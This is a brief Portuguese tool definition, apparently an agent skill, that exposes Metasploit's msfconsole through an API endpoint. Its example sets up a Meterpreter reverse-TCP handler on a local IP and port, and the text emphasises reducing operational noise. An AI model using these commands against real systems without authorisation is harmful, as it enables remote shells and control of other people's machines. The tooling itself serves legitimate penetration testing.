---
name: "msfconsole"
description: "Executa Metasploit console automation. Use quando precisar executar msfconsole via API."
---

# msfconsole

Objetivo

- Metasploit console automation
- Uso orientado a eficiência e menor ruído operacional

Endpoint

- /api/exploit/msfconsole

Requer target

- não

Parâmetros

- commands: lista de comandos

Eficiência

- Defina o escopo antes de executar
- Use opções mínimas para reduzir ruído

Exemplo

```json
{
  "commands": [
    "use exploit/multi/handler",
    "set payload windows/meterpreter/reverse_tcp",
    "set LHOST 192.168.1.100",
    "set LPORT 4444",
    "exploit"
  ]
}
```

Saída

- JSON com success, stdout, stderr, report e artifacts
